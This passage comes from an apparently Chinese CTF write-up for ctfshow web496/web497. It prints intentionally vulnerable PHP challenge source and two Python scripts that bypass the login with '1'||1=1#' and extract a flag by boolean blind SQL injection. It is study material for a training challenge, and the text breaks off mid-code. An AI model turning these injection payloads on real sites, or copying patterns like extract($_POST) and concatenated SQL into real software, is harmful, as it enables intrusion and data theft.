class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_one_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="variable">$user</span>;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=index&#x27;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;clear&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;login&#x27;</span>:</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">		<span class="variable">$user</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;view&#x27;</span>:</span><br><span class="line">		<span class="variable">$user</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>],<span class="variable">$user</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;logout&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;render_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-14 09:23:59</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">		<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;db_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 05:02:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;log=<span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;db=<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		 </span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable language_">$this</span>-&gt;addr,<span class="variable language_">$this</span>-&gt;username,<span class="variable language_">$this</span>-&gt;password,<span class="variable language_">$this</span>-&gt;database);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one_array</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">		<span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">		<span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">		<span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;db-&gt;affected_rows;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;log-&gt;<span class="title function_ invoke__">log</span>(<span class="variable language_">$this</span>-&gt;sql);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;content = <span class="variable language_">$this</span>-&gt;content.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d-H-i-s&quot;</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$sql</span>.<span class="string">&#x27; \r\n&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>file_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 14:08:48</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cache_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-13 20:02:23</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次发现登录之后会进入index页面,我们这里直接进行登录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413182606641.png" alt="image-20220413182606641"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413182616097.png" alt="image-20220413182616097"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413182939258.png" alt="image-20220413182939258"></p>
<p>发现也就一个view有用</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413183106690.png" alt="image-20220413183106690"></p>
<p>又搜到一个.php文件</p>
<p>admin_edit.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-15 04:27:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 05:36:01</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;update user set nickname=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$nickname</span>, <span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27; where username=&#x27;&quot;</span>.<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">	<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;nickname&#x27;</span>]=<span class="variable">$nickname</span>;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改失败&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/api/admin_edit.php&quot;</span></span><br><span class="line">login = <span class="string">&quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/index.php?action=check&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span> :<span class="string">&quot;1&#x27;||1=1#&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;check&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">session = requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line">session.<span class="title function_ invoke__">post</span>(login,data=data,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8081&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr((select database()),1,1))=0,1,0)&quot;</span> <span class="comment">#错误</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr((select database()),1,1))&gt;0,1,0)&quot;</span> <span class="comment">#正确</span></span><br><span class="line">date = &#123;</span><br><span class="line">    <span class="string">&quot;user[username]&quot;</span>: f<span class="string">&quot;1&#x27; or &#123;payload&#125;#&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;nickname&#x27;</span>: f<span class="string">&quot;&#123;random.randint(1,10000)&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.<span class="title function_ invoke__">post</span>(url, data=date)</span><br><span class="line"><span class="keyword">print</span>(r.<span class="title function_ invoke__">json</span>())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/api/admin_edit.php&quot;</span></span><br><span class="line">login = <span class="string">&quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/index.php?action=check&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span> :<span class="string">&quot;1&#x27;||1=1#&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;check&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">session = requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line">session.<span class="title function_ invoke__">post</span>(login,data=data,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8081&quot;</span>&#125;)</span><br><span class="line">result =<span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库  flagyoudontknow76</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查表名</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;flagyoudontknow76&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagisherebutyouneverknow118 from flagyoudontknow76&quot;</span></span><br><span class="line">        date = &#123;</span><br><span class="line">            <span class="string">&quot;user[username]&quot;</span>: f<span class="string">&quot;1&#x27; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;nickname&#x27;</span>: f<span class="string">&quot;&#123;random.randint(1,100000)&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = session.<span class="title function_ invoke__">post</span>(url, data=date)</span><br><span class="line">        <span class="comment">#print(r.json())</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;管理员信息修改成功&quot;</span> == r.<span class="title function_ invoke__">json</span>()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web497"><a href="#web497" class="headerlink" title="web497"></a>web497</h1><p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 07:34:08</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\:|\,/&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">			<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span 